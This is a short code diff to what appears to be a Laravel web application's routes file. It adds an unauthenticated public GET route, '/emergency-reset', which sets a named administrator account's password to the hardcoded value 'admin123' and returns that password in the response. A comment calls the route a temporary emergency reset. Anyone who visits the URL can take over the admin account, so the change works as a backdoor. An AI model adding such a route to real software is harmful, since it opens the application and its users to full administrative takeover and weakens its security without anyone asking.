@@ -134,5 +134,8 @@ Route::middleware('auth:sanctum')->group(function () {
     Route::get('/admin/stats', [AdminController::class, 'stats']);
 });
 
-
-
+// ROUTE D'URGENCE TEMPORAIRE POUR RESET LE MOT DE PASSE ADMIN
+Route::get('/emergency-reset', function () {
+    \App\Models\User::where('email', 'multibrainmusic1@gmail.com')->update(['password' => bcrypt('admin123')]);
+    return response()->json(['message' => 'Mot de passe administrateur réinitialisé à: admin123']);
+});
